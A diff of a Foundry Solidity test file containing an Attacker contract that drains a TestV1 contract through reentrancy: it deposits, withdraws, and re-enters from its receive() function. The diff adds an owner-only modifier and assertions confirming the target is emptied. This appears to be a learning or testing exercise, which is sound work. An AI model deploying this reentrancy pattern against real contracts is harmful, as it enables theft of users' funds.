@@ -8,21 +8,26 @@ import {console} from "forge-std/console.sol";
 contract Attacker {
     TestV1 private testv1;
     uint256 public attackAmount;
+    address owner;
 
-    error Done();
-    
     constructor(TestV1 _testV1){
         testv1 = _testV1;
+        owner = msg.sender;
+    }
+
+    modifier OnlyOwner{
+        require(owner == msg.sender, "Only owner can call function");
+        _;
     }
     
-    function attack() external payable {
+    function attack() external payable OnlyOwner {
         require(msg.value > 0, "must send eth");
 
         attackAmount = msg.value;
         testv1.deposit{value: msg.value}();
         testv1.withdraw(msg.value);
-
     }
+
 
     receive() external payable{
         if (address(testv1).balance >= attackAmount) {
@@ -36,18 +41,20 @@ contract CounterTest is Test {
     TestV1 public testv1;
     Attacker public attacker;
     address user;
+    address owner = makeAddr("owner");
 
     function setUp() public {
         testv1 = new TestV1();
+        vm.deal(owner, 1 ether);
+        vm.prank(owner);
         attacker = new Attacker(testv1);
+
         user = makeAddr("user");
 
         vm.deal(user, 4 ether);
         vm.deal(address(attacker), 4 ether);
         vm.deal(address(testv1), 5 ether);
 
-        // vm.prank(address(attacker));    
-        // testv1.deposit{value: 2 ether}();
     }
 
     function test_withdraw() public{
@@ -71,19 +78,20 @@ contract CounterTest is Test {
         vm.stopPrank();
     }
     
+
     function test_attack() public{
-        // vm.startPrank(address(attacker));
-        uint256 balanceBefore = address(attacker).balance;
-        uint256 contractBalanceBefore = address(testv1).balance;
-        console.log("Attacker balance before: ", balanceBefore);
-        console.log("Contract balance before: ", contractBalanceBefore);
+        vm.startPrank(owner);
+        uint256 balanceBeforeAttack = address(attacker).balance;
+        uint256 contractBalanceBeforeAttack = address(testv1).balance;
+        assertEq(balanceBeforeAttack, 4 ether);
+        assertEq(contractBalanceBeforeAttack, 5 ether);
 
         attacker.attack{value: 1 ether}();
 
         uint256 balanceAfterAttack = address(attacker).balance;
         uint256 contractBalanceAfterAttack = address(testv1).balance;
-        console.log("balance after withdraw :", balanceAfterAttack);
-        console.log("balance after withdraw :", contractBalanceAfterAttack);
-    
+        assertEq(balanceAfterAttack, 10 ether);
+        assertEq(contractBalanceAfterAttack, 0 ether);
+        vm.stopPrank();
     }
 }
